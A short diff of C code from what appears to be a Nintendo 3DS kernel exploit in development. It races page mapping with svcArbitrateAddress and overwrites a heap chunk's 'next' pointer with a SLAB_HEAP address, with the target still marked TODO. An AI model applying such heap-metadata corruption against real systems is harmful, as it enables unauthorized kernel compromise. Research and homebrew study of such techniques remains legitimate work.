@@ -40,14 +40,18 @@ void do_hax() {
     // Create thread to allocate pages.
     threadCreate(allocate_thread, NULL, 0x4000, 0x3F, 1, true);
 
-    // Use svcArbitrateAddress to detect when the memory page has been mapped and overwrite the header.
+    // Use svcArbitrateAddress to detect when the memory page has been mapped.
     while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN, 0, 0) == 0xD9001814);
-    *(u32*) (memAddr + 4) = SLAB_HEAP; // TODO: destination
 
-    // Output debug information.
+    // Retrieve the current header data.
     u32 size = *(vu32*) (memAddr);
     u32 next = *(vu32*) (memAddr + 4);
     u32 prev = *(vu32*) (memAddr + 8);
+
+    // Overwrite the header "next" pointer.
+    *(u32*) (memAddr + 4) = SLAB_HEAP; // TODO: destination
+
+    // Output debug information.
     printf("\"Size\" value: %08X\n", (int) size);
     printf("\"Next\" value: %08X\n", (int) next);
     printf("\"Prev\" value: %08X\n", (int) prev);
